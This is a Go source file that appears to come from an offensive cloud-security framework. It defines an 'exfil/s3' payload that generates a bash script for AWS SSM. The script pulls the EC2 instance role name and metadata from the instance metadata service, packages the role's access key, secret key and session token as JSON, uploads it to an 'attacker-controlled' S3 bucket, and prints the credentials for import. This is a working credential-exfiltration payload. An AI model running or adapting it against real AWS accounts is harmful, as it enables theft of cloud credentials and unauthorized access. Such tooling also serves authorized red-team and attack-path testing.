// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// ExfilS3Payload exfiltrates instance role credentials to an attacker-controlled S3 bucket
// via an SSM command. The `aws s3 cp` call uses the instance role credentials that the
// SSM agent already has access to, no IMDS pre-fetch needed for the upload itself.
// PATHFINDER_IDENTITY_DATA is also written to stdout for auto-import.
type ExfilS3Payload struct{}

func init() {
	_ = payloads.Register(&ExfilS3Payload{})
}

func (p *ExfilS3Payload) GetName() string {
	return "exfil/s3"
}

func (p *ExfilS3Payload) GetDescription() string {
	return "Exfiltrate instance role credentials to an attacker-controlled S3 bucket via SSM command"
}

func (p *ExfilS3Payload) GetTags() []string {
	return []string{
		payloads.TagServiceSSM,
		payloads.TagLanguageBash,
		payloads.TagTechniqueExfil,
		payloads.TagTransportFilesystem,
	}
}

func (p *ExfilS3Payload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "EXFIL_BUCKET",
			Description: "Attacker-controlled S3 bucket name for credential exfiltration",
			Required:    true,
		},
		{
			Name:        "EXFIL_PREFIX",
			Description: "S3 key prefix for exfiltrated data",
			Required:    false,
			Default:     "exfil/",
		},
		{
			Name:        "INCLUDE_METADATA",
			Description: "Include instance metadata (hostname, region, etc.) in the exfiltrated payload",
			Required:    false,
			Default:     "true",
		},
	}
}

func (p *ExfilS3Payload) Validate(options map[string]string) error {
	bucket := options["EXFIL_BUCKET"]
	if bucket == "" {
		return fmt.Errorf("EXFIL_BUCKET is required for exfil/s3 payload")
	}
	if strings.HasPrefix(bucket, "s3://") {
		return fmt.Errorf("EXFIL_BUCKET should be the bucket name only, not an S3 URI")
	}
	return nil
}

func (p *ExfilS3Payload) GenerateCode(options map[string]string) (string, error) {
	exfilBucket := options["EXFIL_BUCKET"]
	exfilPrefix := options["EXFIL_PREFIX"]
	if exfilPrefix == "" {
		exfilPrefix = "exfil/"
	}
	includeMetadata := options["INCLUDE_METADATA"] != "false"

	metadataBlock := ""
	metadataJSON := ""
	if includeMetadata {
		metadataBlock = `
INSTANCE_ID=$(imds_get /latest/meta-data/instance-id)
HOSTNAME=$(imds_get /latest/meta-data/hostname)
AZ=$(imds_get /latest/meta-data/placement/availability-zone)
`
		metadataJSON = `,
  "instance_id": "$INSTANCE_ID",
  "hostname": "$HOSTNAME",
  "region": "$REGION",
  "availability_zone": "$AZ"`
	}

	script := fmt.Sprintf(`echo "Pathrunner: exfil/s3"
echo "Target bucket: %s"

%s
%s
if [ -z "$ROLE_NAME" ]; then
    echo "ERROR: No IAM role attached to this instance"
    exit 1
fi

echo "Found role: $ROLE_NAME"

ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo "unknown")

PAYLOAD=$(cat <<PAYLOAD
{
  "type": "ssm_credential_exfil",
  "role_name": "$ROLE_NAME",
  "account_id": "$ACCOUNT_ID",
  "credentials": {
    "access_key_id": "$AWS_ACCESS_KEY_ID",
    "secret_access_key": "$AWS_SECRET_ACCESS_KEY",
    "session_token": "$AWS_SESSION_TOKEN"
  }%s
}
PAYLOAD
)

EXFIL_KEY="%s${ACCOUNT_ID}/$(date +%%s).json"

echo "Uploading credentials to s3://%s/${EXFIL_KEY}..."
echo "$PAYLOAD" | aws s3 cp - "s3://%s/${EXFIL_KEY}" --content-type "application/json" 2>&1

if [ $? -eq 0 ]; then
    echo "SUCCESS: Credentials written to s3://%s/${EXFIL_KEY}"
else
    echo "FAILED: Could not write to S3 bucket"
fi

echo "--- PATHFINDER_IDENTITY_DATA ---"
echo "NAME=ssm-role/$ROLE_NAME"
echo "TYPE=keys"
echo "ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
echo "SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
echo "SESSION_TOKEN=$AWS_SESSION_TOKEN"
echo "AUTO_SWITCH=false"
echo "--- END_PATHFINDER_IDENTITY_DATA ---"
`, exfilBucket, IMDSHelperSnippet(), metadataBlock, metadataJSON, exfilPrefix, exfilBucket, exfilBucket, exfilBucket)

	return script, nil
}

func (p *ExfilS3Payload) ProcessResult(result string) (string, error) {
	return result, nil
}
